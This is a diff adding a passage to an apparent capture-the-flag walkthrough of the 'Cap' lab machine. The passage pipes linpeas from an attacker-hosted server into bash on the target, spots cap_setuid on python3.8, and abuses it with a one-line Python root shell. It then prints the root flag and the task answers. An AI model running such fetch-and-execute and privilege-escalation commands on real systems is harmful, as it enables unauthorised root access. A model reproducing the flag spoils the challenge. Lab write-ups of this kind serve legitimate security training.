@@ -108,4 +108,28 @@ $ curl -O https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.
 $ python -m http.server
 ```
 
-On the target machine, retrieve the script and pipe it through `bash` to run it directly.  
+On the target machine, retrieve the script and pipe it through `bash` to run it directly:
+
+```sh
+$ curl 10.1.16.102:8000/linpeas.sh | bash
+<SNIP>
+══╣ Processes with capability sets (non-zero CapEff/CapAmb, limit 40) (T1548.001)
+                                                                                                                                                            
+Files with capabilities (limited to 50):
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+<SNIP>
+$ ls -la /usr/bin/python3.8
+-rwxr-xr-x 1 root root 5486384 Jan 27  2021 /usr/bin/python3.8
+```
+
+> What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges? → /usr/bin/python3.8
+
+Notice that `python3` has `cap_setuid` capability where it allows the process to change its UID to become `root`. Checking on `/usr/bin/python3.8` we know that anyone can execute this binary and abuse it to escalate privilege. Run this to gain `root` shell and read the flag:
+
+```sh
+nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@cap:~# cat /root/root.txt
+7c72ac696a84d235a6120f9304d534f3
+```
+
+> Submit the flag located in root's home directory. → 7c72ac696a84d235a6120f9304d534f3
